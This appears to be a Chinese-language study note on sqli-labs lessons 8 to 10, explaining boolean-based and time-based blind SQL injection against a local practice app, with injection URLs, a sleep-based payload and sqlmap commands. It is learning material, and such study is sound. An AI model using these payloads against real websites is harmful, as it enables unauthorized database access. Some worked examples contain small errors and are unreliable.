# Lab8 Blind -- Boolean -- Single quote

## 基础

+ Blind SQL -- 盲注，向数据库发送true或者false的问题，根据应用程序返回的信息判断结果,就类似你送女朋友礼物，女朋友猜是口红吗，你只回答是或者不是，而不能给任何提示

+ 分类：基于布尔型 + 基于时间型

## 基于布尔型的盲注

+ 输入?id=1'啥都不显示，输入?id=1会显示`You are in...`可进行布尔型盲注！
  
+ 基础函数 
  
  + select length(database())
  + select substr(database(),1,1)
+ select ascii(substr(database(),1,1)) `>`/`=`/`<`
  
+ 实战演示

  ```
  http://localhost/sqli-labs-master/Less-8/?id=1'  and length(database()) = 8 --+
  ```

  ![9_2](.\images\9_2.png)

+ sqlmap测试打发

# Lab9_10 -- Blind -- Time Based

## 基于时间的盲注

+ lab9和10相比于lab8就更加坑爹了，lab9,10在数据库查询结果正确或错误的情况下都返回一样的东西！！所以只能用基于时间的盲注了
+ lab9 和lab10的区别仅仅是id用单引号和双引号的区别而已，maybe作者就是想让我们提高意识，在真实环境中测试的时候要充分考虑输入id的形式，抑或是让我们在设计网页的时候要考虑这个问题。
+ GET基于时间的盲注

```
if(ascii(substr(database(),1,1)=115,1,sleep(3)));
当数据库名第一个字母的ascii码等于115时，执行一次sleep(3)函数3s
substr(database(),1,1)表示从第一个字符开始数第一个字符
如substr(database(),1,1) --> security --> s
substr(database(),1,2) --> security --> e
substr(database(),2,1) --> security --> e
```

+ 通过微弱的时间差来判断我们的条件是否有被满足（如下图） -- 当然，需要尝试许多次，以盲注database() -- security为例，8个字母，一个字母查询时间大概为1s，最坏情况需要查询26*8=204s,也就是3分多钟

![9_1](C:\Users\Henry\Desktop\Sqli_Analysis\images\9_1.png)



## SQL测试大法

+ sqlmap测试大法

  -  --technique=TECH（BEUSTQ）
    - B：Blooean
    - E：Error
    - U：Union
    - S：Stack(不晓得)
    - T：Time
    - Q：Query

+ ```
  sqlmap.py -u "http://localhost/sqli-labs-master/Less-9/?id=1" --technique T --dbs
  基于时间盲注技术
  ```

+ ```
  sqlmap.py -u "http://localhost/sqli-labs-master/Less-9/?id=1" --technique B --dbs
  基于布尔型盲注技术
  ```